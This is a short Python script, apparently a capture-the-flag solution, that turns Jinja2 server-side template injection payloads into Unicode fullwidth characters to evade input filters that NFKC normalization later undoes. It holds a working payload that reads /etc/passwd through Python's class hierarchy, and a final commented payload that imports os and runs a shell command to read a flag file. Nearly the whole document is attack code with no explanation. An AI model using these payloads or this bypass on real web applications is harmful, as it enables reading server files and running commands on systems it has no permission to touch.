import unicodedata

HALFWIDTH = (
    'abcdefghijklmnopqrstuvwxyz'
    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    '0123456789'
    '{}[]()<>'
    ':;.,!?\'"'
    '+-*/=_%&$#@^`~|\\'
    ' '
)
FULLWIDTH = (
    'ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ'
    'ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ'
    '０１２３４５６７８９'
    '｛｝［］（）＜＞'
    '：；．，！？＇＂'
    '＋－＊／＝＿％＆＄＃＠＾｀～｜＼'
    '　'  
)

trans = str.maketrans(HALFWIDTH, FULLWIDTH)

def to_fullwidth(text):
    return text.translate(trans)

payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
fullwidth_payload = to_fullwidth(payload)

print("Fullwidth payload:")
print(fullwidth_payload)

print("\nAfter NFKC normalize:")
print(unicodedata.normalize("NFKC", fullwidth_payload))



# Payload Final:
# ｛｛　ｓｅｌｆ．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿．＿＿ｂｕｉｌｔｉｎｓ＿＿．＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｐｏｐｅｎ（＇ｃａｔ　／ｈｏｍｅ／ｈａｎｇｕｌ／ｆｌａｇ＇）．ｒｅａｄ（）
#  ｝｝
